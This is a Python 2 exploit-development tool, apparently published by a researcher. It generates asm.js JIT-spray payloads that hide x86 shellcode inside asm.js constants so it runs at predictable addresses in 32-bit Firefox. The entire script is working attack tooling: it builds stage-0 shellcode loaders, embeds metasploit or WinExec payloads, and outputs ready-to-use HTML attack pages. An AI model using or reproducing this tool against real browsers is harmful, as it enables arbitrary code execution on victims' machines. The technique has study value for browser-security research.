#!/usr/bin/env python2

## version 0.0 

### GENERATES JIT SPRAY PAYLOADS BY HIDING OPCODES WITHIN ASM.JS CONSTANTS ###

## nothing special, code's a bit blown up and overcomplicated
## runs on linux only, generates windows payloads
## radare2 or metasploit could be used to write this wrapper, but hey, what the
## heck

## hacked together...
## simple shellcode would have been sufficient as poc.
## However, here's an more generic approach
## unmaintained

## - Rh0


import distorm3, sys, os, argparse, subprocess, re, struct
from binascii import hexlify, unhexlify
from struct import pack, unpack 

### some globals ###

## distorm3 helper
OFFSET=0
LEN=1
MNEMONIC=2
OPCODE=3

cd = os.path.dirname(__file__)

asm_dir = cd + "/asm_payloads"
templates = cd + "/asmjs_templates"

stage0_loader_3 = asm_dir + '/three_byte_stager.asm'
stage0_loader_2 = asm_dir + '/two_byte_stager.asm'

## max size for payload with dynamic loader
PAYLOAD_MAX_SIZE_STAGER_3 = 0x405 ## three byte stage0_loader needs size % 3 == 0
PAYLOAD_MAX_SIZE_STAGER_2 = 0x204 ## two byte stage0_loader needs size % 4 == 0

## nasm assembler path
NASM="nasm" # adjust if necessary
## write asm.js compatible nasm source to:
asm_tmp_src = cd + "/tmp/tmp.asm" 
## assemble payload into:
asm_tmp_bin = cd + "/tmp/tmp.bin" 

add_eax = "db 0x05\n"
nop = "db 0x90\n" # = "nop" should be ok, too

## bytes to mask 05 (= add eax, ...)
mask_to_test_al = "db 0xa8\n"
test_al = "a8"
pushfd = "db 0x9c\n"
popfd = "db 0x9d\n"

header ="""
    ======================
    == ASM.JS JIT-SPRAY ==
    ======================
"""

## Usage, Help and Description ##
def parse_args():
    arg_parser = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter,

    description = header + 
"""

Tool to create asm.js scripts usable to 'JIT' spray shellcode payloads to
predictable addresses in 32-bit Firefox. Tested with Firefox up to 50.1.0.
- Rh0 
""",

    epilog=

"""

Examples:

    (*) Embed a payload as an asm.js float constant pool

    {toolname:s} -f metasploit_x86_messagebox.py

    (*) Generate a dynamic asm.js stage-0 loader:

    {toolname:s} -l
    {toolname:s} -t dynamic -l

    (*) Generate a static asm.js file and embed a x86 binary shellcode payload
        which gets loaded by the stage-0 loader at runtime

    {toolname:s} -t static -l metasploit_x86_messagebox.py

    (*) Generate a static asm.js file end embed a WinExec("calc")
        payload (No stage-0 loader):

    {toolname:s} -t static -p WinExec_calc.asm
    
""".format(toolname=sys.argv[0])
    )

    ## -f, -l and -p are mutually exlusive
    group = arg_parser.add_mutually_exclusive_group(required=True)

    group.add_argument("-f", metavar="<file>.py",
        dest="float_pool_payload",help="""Generate executable asm.js float
        constant pool payload from <file>.py. <file>.py should contain the
        binary payload in a 'buf' variable. All other options are ignored. NOTE:
        For Firefox => 46 self-modifying payloads won't work, due to W^X
        permissions of JIT regions.""")

    # in case -P is used, stage0 becomes the custom payload
    group.add_argument("-p", metavar="<file>.asm",
        default=stage0_loader_3, dest="stage0", help="""The custom payload/shellcode
        to embed: <file>.asm is an asm file in nasm source format.""")
        
    group.add_argument("-l", metavar="<file>.py", dest="bin_payload",
        default="disabled", nargs='?', help="""Generate asm.js three-byte
        stage-0 loader and insert a custom binary payload from <file>.py.
        <file>.py should contain the payload in a 'buf' variable. If this option
        is used together with '-t dynamic', then <file>.py may be omitted and
        the payload can be inserted manually into the generated script""")

    arg_parser.add_argument("-d", metavar="<distance>",
        default='disabled', dest="two_byte_stager", help="""Generate two-byte
        sized stage0 loader instead of three-byte sized stage0. Specify the jump
        <distance> in bytes between the asm.js constants. Only valid with -l and
        -t dynamic.""")
        
    # default: -t dynamic
    arg_parser.add_argument("-t", metavar="<type>", default="dynamic",
        dest="payload_type", help="""Type of asm.js payload to generate: 'dynamic'
        or 'static'. 'static' inlines shellcode into asm.js instructions and
        outputs an asm.js file. 'dynamic' creates an asm.js runtime loader which
        embeds shellcode during runtime.""")

    arg_parser.add_argument("-o", metavar="<file>",
        default=None, dest="output", help="""Write output asm.js
        payload to a file""")

    args = arg_parser.parse_args()
    return args


reg8 = {"b8": ("al","ah"), "bb": ("bl","bh"), "b9": ("cl","ch"), "ba": ("dl","dh")}
reg16 = {"b8": ("ax"), "bb": ("bx"), "b9": ("cx"), "ba": ("dx")}
reg32= {"b8": ("eax"), "bb": ("ebx"), "b9": ("ecx"), "ba": ("edx")}


## set 2 least significant bytes separately
## and create nasm instructions (3 byte stager)
def transform_mov_3bytes(opcode, imm32):
    return [
        "mov " + reg8[opcode][0] + ", 0x" + imm32[6:8]+ "\n",
        "mov " + reg8[opcode][1] + ", 0x" + imm32[4:6] + "\n"
    ]


def transform_mov_2bytes(instr_nr, opc, imm32le):
    imm32 = unhexlify(imm32le)
    imm32 = int(hexlify(imm32[::-1]), 16)
    mov = []

    ## FIXME: xchg eax with reg if eax is dest reg
    ## check imul [esp]
    if opc!= "b8":
        mov += ["PUSH EAX\nNOP"]
    else:
        raise Exception("FIXME")

    mov += ["XOR EAX, EAX"]
    mov += ["mov AL, 0x{:x}".format(
        [0, ((imm32 & 0xff0000) >> 16) + 1][(imm32 & 0xff0000) >> 16 < 0xff]
    )]
    mov += ["MOV AH, 0x{:x}".format(((imm32 & 0xff000000) >> 24) + 
        [0, 1][(imm32 & 0xff0000 >> 16) == 0xff]
    )]
    mov += ["XOR {REG32:s}, {REG32:s}".format(REG32=reg32[opc])]
    mov += ["DEC {REG16:s}".format(REG16=reg16[opc])]
    ## KILLS EDX! FIXME
    mov += ["MUL {REG32:s}".format(REG32=reg32[opc])]
    mov += ["MOV AL, 0x{:x}".format((imm32 & 0xff))]
    mov += ["MOV AH, 0x{:x}".format((imm32 & 0xff00) >> 8)]

    if opc != "b8":
        mov += ["MOV {REG32:s}, EAX".format(REG32=reg32[opc])]
        mov += ["POP EAX\nNOP"]

    return mov


##  specific conditional ?
def instr_is_jcc(mnemonic):
    mne = mnemonic.lower()
    if (mne.startswith("j") and 
        ## ...exceptions: 
        not mne.startswith("jmp") and 
        not mne.startswith("jecxz")
        ):
        return 1

    return 0


##  MOV REG32, IMM32 ? (REG 32 != ESI, EDI, ESP, EBP)
def instr_is_mov_reg32_imm32(hex_opcode):
    #if 0xb8 <= int(hex_opcode[:2], 16) <= 0xbf:
    if 0xb8 <= int(hex_opcode[:2], 16) <= 0xbb:
        return 1
        
    return 0


## CMP or TEST? add instructions if necessary
def instr_is_compare(mnemonic):
    mne = mnemonic.lower()
    ## add your allowed preceding instr here
    if mne.startswith("test") or mne.startswith("cmp"):
        return 1

    return 0

## naive algo to insert jump cave if short jump is out of range
## if we assemble the 2nd time and get a "jump is out of range error", then we
## inserted to much stuff between jmp and target. fix it via jump caves
## FIXME: currently only inserting one cave
def transform_long_jump(*args):
    global jmp_cave_nr
    ## abort at some point to prevent endless recusrion FIXME
    if jmp_cave_nr == 100:
        raise Exception(" Stopping recursion. FIXME: jump cave insertion")
    input = args[0]
    output = args[1]
    error = args[2]
    ## catch nasm short jump error
    if error.find(" error: short jump is out of range") != -1:
        #print error
        err_line_no = int(error.split(":")[1])  - 1 ## line of error
        #print err_line_no
        ## read file
        asm = file(input,"rb").readlines()
        ## get label
        #print asm[err_line_no].split()
        label = asm[err_line_no].split()[-1].replace("\n", "") ## FIXME if  not preceded by \s
        #print label
        print "\n[-] ==== short jump error in line", err_line_no, "with instruction:"
        print ">>> ", asm[err_line_no], ">>> NASM ERROR:\n", error, "<<<"
        cave_lbl = "__JMP_CAVE__{:d}".format(jmp_cave_nr)
        asm[err_line_no] = asm[err_line_no].replace(label, cave_lbl)
        jmp_cave_nr += 1
        jmp_cave_line_no = 0
        for line_no in range(0,len(asm)):
            ## get target
            if asm[line_no].find(label) != -1:
                if err_line_no > line_no:
                    #print label
                    ## FIXME: adjust fixed num dynamically based on distance between constants
                    # 2 for distance > 5 < 8 ; 4 for distance > 10
                    jmp_cave_line_no = line_no + (err_line_no - line_no)/4 
                    break
                #elif err_line_no <= line_no
                else: ## FIXME
                    jmp_cave_line_no = err_line_no + (line_no - err_line_no)/4
                    pass
        i = -3
        while 1:
            if asm[jmp_cave_line_no + i] == spacer: ## strip \n
                jmp_cave_line_no += i
                break
            i += 1

        asm[jmp_cave_line_no] = asm[jmp_cave_line_no].replace(spacer, 
            spacer + cave_lbl + ":\nnop\nnop\njmp SHORT {target:s}\n".format(target=label)
            +spacer)

        file(input, "wb").write("".join(asm))
        ## recursively rerun nasm 
        nasm_assemble(input, output, catch=transform_long_jump)
        print "[+] Successfully inserted jmp cave " + cave_lbl
    else:
        sys.stderr.write(error)
        raise Exception("[-] Nasm error\n")


## nasm wrapper
def nasm_assemble(input, output, catch=""):
    if not os.path.isfile(input):
        sys.stderr.write("[-] Error: File "+ input + " not found\n")
        exit(0)

    nasm = subprocess.Popen(
        [NASM, input, "-o", output,"-f", "bin"],
        shell=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    ## check nasm messages
    retCode = nasm.wait()
    if catch and retCode:
        catch(input, output, nasm.stderr.read()) ## callback to handle nasm errors
    elif retCode:
        sys.stderr.write(nasm.stderr.read() + "\n")
        raise Exception("[-] Error: Failed to assemble payload (check your "+
            "nasm file \"" + input + "\")")

    nasm_warning = nasm.stderr.read()
    if nasm_warning:
        sys.stderr.write(" [+] NASM: " + nasm_warning + "\n")
    ## read opcodes
    return file(output,"rb").read()


## mainly serves the purpose of getting the length of each opcode.
## returns distorm decoded obj
def asm_to_dasm(asm_shellcode): 
    max_instr_len = 3
    if args.two_byte_stager != 'disabled':
        max_instr_len = 2

    ## assemble
    payload = nasm_assemble(asm_shellcode, asm_tmp_bin)

    ## disassemble 
    dasm = distorm3.Decode(0, payload, distorm3.Decode32Bits)

    ## perform some simple sanity checks
    for i in range(0, len(dasm)): 
        instr = dasm[i] # 0: offset, 1: len, 2: mnemonic 3: opcodes (hexlified)
        
        ## 1) check if all opcodes are <= 2 or 3 bytes except mov REG32, IMM32
        if instr[LEN] > max_instr_len and not instr_is_mov_reg32_imm32(instr[OPCODE]):
            raise Exception(("[-] Instruction \"{:s}\" is greater than {:d} " +
                "bytes (currently unsupported)").format(instr[MNEMONIC],
                max_instr_len))

        ## 2) Jccs have to be preceded by test/cmp/... for 3 byte stager
        if args.two_byte_stager != 'disabled' and instr_is_jcc(instr[MNEMONIC]):
            pre_instr = dasm[i-1] ## preceding instr
            if not instr_is_compare(pre_instr[MNEMONIC]):
            ## add your allowed preceding instr here
            #if not pre_instr[MNEMONIC].startswith("TEST") and not pre_instr[MNEMONIC].startswith("CMP"):
                raise Exception("[-] Conditional jumps have to be " +
                    "preceded immediately by flag-setting instruction")

    return dasm


## we need to parse the source to connect each line to the length of the
## corresponding instruction, to insert masking bytes and padding later on,
## before reassembling it
def parse_nasm_source(asm_shellcode, replacements={}):
    asm_src = file(asm_shellcode,"rb").read()

    ## inline statements/macros 
    for pattern, replacement in replacements.iteritems():
        asm_src = asm_src.replace(pattern,replacement)

    ## remove some nasm directives
    ## OTHER directives which span lines shoud NOT appear in source or need to
    ## be added here
    asm_src = re.sub("BITS 32.*?\r*?\n", "", asm_src, flags=re.I)
    asm_src = re.sub("Section.*?\r*?\n", "", asm_src, flags=re.I)
    asm_src = re.sub("global.*?\r*?\n", "", asm_src, flags=re.I)
    ## FIXME
    asm_src = re.sub("%define.*?\r*?\n", "", asm_src, flags=re.I)

    ## remove comments
    asm_src = re.sub(";.*", "", asm_src, flags=re.I)

    ## remove empty lines
    #asm_src = filter(lambda line: line != '',
    #    [re.sub("^\s*$", "", line) for line in asm_src.splitlines()])

    asm_lines = asm_src.splitlines()
    asm_src = ''
    label_text = ''
    ## remove empty lines and inline labels
    for line in asm_lines:
        ## db can break stuff, so warn
        if re.match("^\s*db ", line, flags=re.I):
            print("[+] Warning: Encountered \"db\" in payload source")
            
        if re.sub("^\s*$", "", line) != '':
            label = re.match("\s*(\w+:)\s*", line)
            ## line is label
            if label:
                label_text = label.group(0)
                continue
        ## line is empty
        else:
            continue
        
        if label_text:
            ## concat label with line
            asm_src += label_text + line + "\n"
            label_text = ''
        else:
            ## add line
            asm_src += line + "\n"
        
    #print asm_src
    return asm_src.splitlines()


## create assembleable nasm source. When assembled, it has the format of asm.js
## where the payload is hidden within constants
def generate_asm_js_asm_src(asm, dasm):
    if args.two_byte_stager == 'disabled':
        return generate_3_byte_asm_js_asm_src(asm, dasm)
    return generate_2_byte_stage0_nasm_src(asm, dasm)


def generate_2_byte_stage0_nasm_src(asm, dasm):
    asm_js_asm = ''
    asm_js_space = 2 ## nr. opcodes we can hide in one instruction
    process_mov = 0 ## special care of mov
    line_no = 0
    label_nr = 0 ## one label for each asm_js_constant
    ## space between constants
    instr_label = "asm_js_constant_{:04x}"
    instr_label_target = instr_label + ":\n" 

    ## connect asm lines to instruction lengths, insert mask and pads.
    while line_no < len(asm):
        if process_mov:
            asm_js_asm += process_mov[0] + "\n"
            process_mov = process_mov[1:]
            label_nr += 1
            label = instr_label.format(label_nr)
            ## insert jmp to next constant/hidden instruction
            asm_js_asm += "jmp {:s}\n".format(label)
            asm_js_asm += spacer
            asm_js_asm += instr_label_target.format(label_nr)
            asm_js_space = 2
            continue

        asm_line = asm[line_no] + "\n"
        instr_len = dasm[line_no][LEN]
        instr_opc = dasm[line_no][OPCODE] # hexlified
        instr_mne  = dasm[line_no][MNEMONIC]

        if instr_is_mov_reg32_imm32(instr_opc) and asm_js_space == 2:
            imm32le = instr_opc[2:]
            process_mov = transform_mov_2bytes(label_nr,
                instr_opc[:2], imm32le)
            line_no += 1
            continue
        
        ## insert instr
        if instr_len <= asm_js_space:
            asm_js_asm += asm_line
            asm_js_space -= instr_len
            line_no += 1
            continue
        
        ## no space, so pad with nops
        while asm_js_space > 0:
            asm_js_asm += nop
            asm_js_space -= 1
        
        label_nr += 1
        label = instr_label.format(label_nr)
        ## insert jmp to next constant/hidden instruction
        asm_js_asm += "jmp {:s}\n".format(label)
        asm_js_asm += spacer
        ## insert label
        asm_js_asm += instr_label_target.format(label_nr)
        asm_js_space = 2

    while asm_js_space > 0:
        asm_js_asm += nop
        asm_js_space -= 1

    return asm_js_asm


def generate_3_byte_asm_js_asm_src(asm, dasm):
    asm_js_asm = ''
    asm_js_space = 3 ## nr. opcodes we can hide in one instruction
    process_mov = 0 ## special care of mov
    line_no = 0

    ## connect asm lines to instruction lengths, insert mask and pads.
    while line_no < len(asm):
        asm_line = asm[line_no] + "\n"

        instr_len = dasm[line_no][LEN]
        instr_opc = dasm[line_no][OPCODE] # hexlified
        instr_mne  = dasm[line_no][MNEMONIC]

        ## mov spans 2 asm.js instructions, hence fix
        ## least sig. 2 bytes which get clobbered by asm.js
        if process_mov:
            asm_js_asm += nop + mask_to_test_al + add_eax
            asm_js_asm += process_mov[0] + nop + mask_to_test_al + add_eax
            asm_js_asm += process_mov[1]
            asm_js_space = 1
            process_mov = 0

        ## start asm.js add eax, ... instruction
        if asm_js_space == 3:
            asm_js_asm += add_eax
        
	## take care about cmp/test and flag saving (pushfd)
	## or take care about jcc and flag restoring (popfd)
        if instr_is_compare(instr_mne) or instr_is_jcc(instr_mne):
            restore_flags = [0,1][instr_is_jcc(instr_mne)] # else save flags
            ## cmp/test + pushfd or popfd + jcc
            instr = ["pushfd", "popfd"][restore_flags]
            opcode = [pushfd, popfd][restore_flags]
            asm_instr = [asm_line + pushfd, popfd + asm_line][restore_flags]
            ## cmp or jcc can't use max. space, because we'll prepend a pushfd
            ## or append a popfd
            if instr_len >= 3: 
                raise Exception("[-] " + instr_mne + " is too long (" +
                    instr_len + "). Unable to insert " + instr)
            elif asm_js_space != 0 and (asm_js_space - 1) >= instr_len:
                asm_js_asm += asm_instr
                asm_js_space -= (instr_len + 1) #  1 = len(pushfd/popfd)
                line_no += 1
                continue

        ## take special care about movs
        if instr_is_mov_reg32_imm32(instr_opc) and asm_js_space > 0:
            while asm_js_space > 1:
                asm_js_asm += nop
                asm_js_space -= 1
            asm_js_asm += asm_line
            asm_js_space -= 1
            ## transform to big endian
            imm32 = unhexlify(instr_opc[2:])
            imm32 = imm32[::-1]
            imm32 = hexlify(imm32)
            ## on next iteration insert instructions to set 2 lsb bytes
            process_mov = transform_mov_3bytes(instr_opc[:2], imm32)
            line_no += 1
            continue
            
        if instr_len <= asm_js_space:
            asm_js_asm += asm_line
            asm_js_space -= instr_len
            line_no += 1
            continue
        
        ## no space, so pad with nops
        while asm_js_space > 0:
            asm_js_asm += nop
            asm_js_space -= 1
        
        asm_js_asm += mask_to_test_al
        ## new game, new luck
        asm_js_space = 3
        
    ## adjust last instruction
    while asm_js_space > 0:
        asm_js_asm += nop
        asm_js_space -= 1

    asm_js_asm += mask_to_test_al

    return asm_js_asm


## and create asm.js compatible constants with hidden opcodes
def generate_asm_js_constants(payload_bin):
    max_instr_len = 3
    offset = 1
    if args.two_byte_stager != 'disabled':
        max_instr_len = 2
        offset = 0

    hex_payload = hexlify(payload_bin)
    constants = []
    # payload starts in the middle/ after 1st byte
    dasm = distorm3.Decode(0, payload_bin[offset:], distorm3.Decode32Bits)
    ## FIXME: current transformation may result in long jumps
    for instr in dasm:
        if instr[LEN] > max_instr_len and not instr_is_mov_reg32_imm32(instr[OPCODE]):
            raise Exception("[-] Transformed instruction " + instr[MNEMONIC] +
                " is too long. FIXME")

    ## 3-byte payload
    if args.two_byte_stager == 'disabled':
        ## 5 byte chunks
        for i in range(0, len(hex_payload), 10):
            #print hex_payload[i:i+10]
            constants += [hex_payload[i:i+10][2:]] ## strip 1st byte
            ## assume mov and insert
            if constants[-1][-2:] != test_al:
                ## replace least sig, byte in mov REG32, IMM32 with masking byte
                #print constants[-1]
                constants[-1] = "".join(list(constants[-1])[:-2]) + test_al
                #print constants[-1]
    else:
        for i in range(0, len(hex_payload), 8 + byte_distance*2):
            constants += [hex_payload[i:i+8]] ## strip 1st byte
            #print constants[-1]
        while len(constants[-1]) < 8:
            constants[-1] += "90"

    return constants


def gen_float_payload():
    exec(file(args.float_pool_payload,"rb").read()) # :P
    try:
        payload_sz = len(buf)
    except:
        raise Exception("[-] Check " + args.float_pool_payload + " for 'buf'")

    ## use a fixed payload size to predict location of float pool
    if len(buf) > 0x400:
        raise Exception("[-] Payload is > 0x400 bytes")

    junk = 0
    i = 0
    while len(buf) < 0x400:
        i += 1
        if i % 8 == 0:
            junk += 1
            buf += chr(junk)
            continue
        buf += "A"

    float_chunks = [buf[i:i+8] for i in range(0, len(buf), 8)]
    ## asm.js eliminates duplicate constants, hence, all floats have to be
    ## different. sanity check for dupes

    if len(float_chunks) != len(set(float_chunks)):
        raise Exception("Fixme or your binary payload")

    asm_js_payload = [unpack("<d", chunk) for chunk in float_chunks]
    asm_js_payload = [str(flt)[1:-2] for flt in asm_js_payload]

    ## sanity check floats
    for i in range(len(asm_js_payload)):
        if asm_js_payload[i] == 'nan':
            raise Exception("[-] No float representation for " +
                hexlify(float_chunks[i]) + " (pos: " + str(i*8) + " in payload)")

    asm_js_payload =  ",\n".join(asm_js_payload) + "\n)"
    template = file(templates+"/pool_of_floats.html", "rb").read()
    template = template.replace("%CMDLINE%", " ".join(sys.argv))
    template = template.replace("%HEADER%", "<pre>" + header  + "</pre>")
    asm_js_payload = template.replace("%PAYLOAD%", asm_js_payload)

    ## print or save payload
    if args.output == None:
        print asm_js_payload
    else:
        file(args.output, "wb").write(asm_js_payload)

    


def main():
    global args
    global byte_distance
    global spacer
    global jmp_cave_nr
    jmp_cave_nr = 0
    args = parse_args()

    #print args
    #print args.payload
    #print args.stage0

    ## constant pool spray 
    if args.float_pool_payload != None:
        gen_float_payload()
        return

    PAYLOAD_MAX_SIZE = PAYLOAD_MAX_SIZE_STAGER_3
    ## check if 2-byte stager should be used
    if args.two_byte_stager != 'disabled':
        byte_distance = int(args.two_byte_stager)
        spacer = "db '{:s}'\n".format("A" * byte_distance)
        if not (byte_distance > 0 and byte_distance <= 0x1000 and 
            args.payload_type == 'dynamic' and 
            args.stage0 == stage0_loader_3):
            print("[-] Error: option -d can only be used with -t dynamic and" +
                " requires an int > 0")
            exit(0)
        
        ## using 2 byte sized stage0 loader
        PAYLOAD_MAX_SIZE = PAYLOAD_MAX_SIZE_STAGER_2
        args.stage0 = stage0_loader_2
            
    if args.payload_type != 'static' and args.payload_type != 'dynamic':
        print "[+] Error: wrong -t option. see {:s} --help".format(sys.argv[0])
        exit(0)

    ## custom asm payload as stage0 and no bin payload
    if args.bin_payload == 'disabled':
        payload_sz = 0
    ## enabled stage0 loader but no binary payload
    elif args.bin_payload == None:
        if args.payload_type == 'static':
            print("[-] Error: Need a binary payload/shellcode, when using -t static")
            exit(0)
        payload_sz = PAYLOAD_MAX_SIZE
    ## enabled stage0 loader with binary payload
    else:
        ## load bin payload into 'buf' 
        exec(file(args.bin_payload,"rb").read()) # hehe
        try:
            payload_sz = len(buf)
        except:
            buf = ''

        if payload_sz == 0:
            print("[-] Error: {:s} no payload in variable " +
                "'buf'").format(args.bin_payload)
            exit(0)
        ## hardcoded payload size for dynamic loader to be able to easily
        ## replace shellcode payloads within the resutling script
        elif args.payload_type == 'dynamic':
            if payload_sz > 0x400:
                print("[-] Error: shellcode is too big")
                exit(0)
            else:
                payload_sz = PAYLOAD_MAX_SIZE
        ## set payload size to size % 3 == 0
        elif args.payload_type == 'static':
            payload_sz = \
            [payload_sz, payload_sz + (3 - payload_sz % 3) ][payload_sz % 3 != 0]
            payload_sz += 3 # compensate 3 byte nop of stager (lea esp, [esp])

        print "[+] Using shellcode from " + args.bin_payload

    ## assemble stage0 (stage0 = loader or custom payload)
    dasm = asm_to_dasm(args.stage0)

    ## parse stage0 source
    if args.stage0 == stage0_loader_3:
        ## insert payload size into it
        asm = parse_nasm_source(args.stage0, {"PAYLOAD_SIZE":
            "{:d}".format(payload_sz)})
    elif args.stage0 == stage0_loader_2:
        ## insert payload size and distance into it
        asm = parse_nasm_source(args.stage0, {"PAYLOAD_SIZE":
            "{:d}".format(payload_sz), "DISTANCE": "{:d}".format(byte_distance)})
    else: ## custom payload
        asm = parse_nasm_source(args.stage0)
    if len(asm) != len(dasm):
        raise Exception("[-]: w00t?! number of instructions unequal between "+
            "binary and source payload.")

    ## connect source code lines to opcodes
    ## and generate assemblable nasm source (-> useful for label arithmetic)
    asm_js_asm = generate_asm_js_asm_src(asm, dasm)

    ## write assembleable nasm payload
    file(asm_tmp_src, "wb").write("BITS 32\n" + asm_js_asm)

    ## Assemble asm.js compatible nasm source
    if  args.stage0 == stage0_loader_2:
        payload = nasm_assemble(asm_tmp_src, asm_tmp_bin, catch=transform_long_jump)
    else:
        payload = nasm_assemble(asm_tmp_src, asm_tmp_bin)

    ## generate asm.js constants from assembled stage0 code, perform some naive sanitiy checks
    asm_js_constants = generate_asm_js_constants(payload)
    #print asm_js_constants

    ## read appropriate template

    if args.stage0 == stage0_loader_2:
        template = file(templates+"/dynamic_2_byte.html", "rb").read()
    else:
        template = file(templates+"/{:s}.html".format(args.payload_type),"rb").read()
    template = template.replace("%CMDLINE%", " ".join(sys.argv))
    template = template.replace("%HEADER%", "<pre>" + header  + "</pre>")
    asm_js_payload = ""

    ## generating static asm.js
    if (args.payload_type == "static"): # never entered for 2byte stager
        
        val = " "*8 + "val = (val + 0x{code:s})|0;\n"
        
        nr_nops = 40 # 120 + 120/3 
        for i in range(0, nr_nops):
            asm_js_payload += val.format(code="a8909090");
        
        ## generate asm.js payload from constants 
        for constant in asm_js_constants:
            ## strip first byte and transform to little endian
            constant = "".join([constant[i-2:i] for i in range(8,0,-2)])
            asm_js_payload += val.format(code=constant)
        
        ## insert custom payload which the stage0 loader should load, if any
        if payload_sz > 0:
            for i in range(0, payload_sz, 3):
                constant = buf[i:i+3]
                ## only for last iter of buf
                while len(constant) < 3: constant += "\x90"
                constant = test_al + hexlify(constant[::-1])
                asm_js_payload += val.format(code=constant)
        
        ## create the final asm.js payload
        asm_js_payload = template.replace("%PAYLOAD%", asm_js_payload)

    ## generating dynamic asm.js
    elif args.payload_type == "dynamic":

        template = template.replace("%MAX_PAYLOAD_SIZE%",
            "{:d} // DO NOT CHANGE".format(payload_sz))

        ## nr bytes of payload per constant
        bytes_per_constant = [3,4][args.stage0 == stage0_loader_2]
        nr_constants = 0
        js_array_stage0 = '[\n\t'
        ## insert stage 0 and format it nicely
        for constant in asm_js_constants:
            nr_constants += 1
            constant = "".join([constant[i-2:i] for i in range(bytes_per_constant*2,0,-2)])
            #js_array_stage0 += "{:d}".format(int(constant, 16)) + ", "
            js_array_stage0 += "'{:s}'".format(constant) + ", " # payload hex bytes
            if nr_constants == 21/bytes_per_constant: ## formatting
                js_array_stage0 += "\n\t"
                nr_constants = 0
        
        if js_array_stage0[-2:] == "\n\t":
            js_array_stage0 = js_array_stage0[:-4] + "\n]\n"
        else:
            js_array_stage0 = js_array_stage0[:-2] + "\n]\n"
        
        template = template.replace("%STAGE0%",
            "{:s}".format(js_array_stage0))
        
        ## insert bin payload
        if args.bin_payload == 'disabled': # never entered for 2 byte stager
            ## custom stage0 payload, no bin payload insertable 
            ## remove related bin payload sigs from template
            template = re.sub("#IF BIN_PAYLOAD#.*?#ENDIF BIN_PAYLOAD#","",
                template, flags=re.DOTALL)
            js_payload = ""
        elif args.bin_payload == None:
            ## stage0 loader - bin payload empty but insertable 
            js_payload = "'\\x90\\x90\\x90\\xcc' // insert your payload here\n"
        else:
            ## inserting bin payload <= 0x400 bytes available
            js_payload = "'' +\n\t'"
            nr_byte = 0
            for byte in buf:
                nr_byte += 1
                js_payload += "\\x" + "{:02x}".format(ord(byte))
                if nr_byte == 13: ## formatting
                    js_payload += "' +\n\t'"
                    nr_byte = 0
            js_payload += "'\n"

        template = re.sub("#IF BIN_PAYLOAD#|#ENDIF BIN_PAYLOAD#","", template)
        if args.two_byte_stager != 'disabled':
            template = template.replace("%DISTANCE%", str(byte_distance))

        asm_js_payload = template.replace("%BIN_PAYLOAD%",
            "{:s}".format(js_payload))
            
    if args.output == None:
        print asm_js_payload
    else:
        file(args.output, "wb").write(asm_js_payload)


if __name__ == "__main__":
    main()

